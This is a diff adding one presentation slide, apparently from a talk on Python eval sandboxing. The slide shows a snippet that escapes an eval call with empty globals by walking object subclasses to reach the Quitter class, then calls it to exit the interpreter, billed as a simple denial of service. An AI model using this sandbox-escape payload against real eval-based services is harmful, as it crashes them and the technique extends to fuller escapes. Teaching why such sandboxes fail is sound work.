@@ -1,0 +1,25 @@
+name: So lets do something nasty
+---
+body:
+
+### Lets Do Something Nasty...
+<div class="fragment fade-in">
+Simple denial of service.
+<pre><code class="hljs" data-trim>
+syntax = """
+[
+    s for s in ().__class__.__base__.__subclasses__() 
+    if s.__name__ == 'Quitter'
+][0]('', 0)()
+"""
+eval(syntax, {}, {})
+</code></pre>
+</div>
+---
+notes:
+
+- Use a list comprehension to find the `Quitter` class (an instance of this is the exit builtin).
+- Create our own instance instance
+- Call the instance to instruct the Python interpreter to exit.
+---
+order: 3
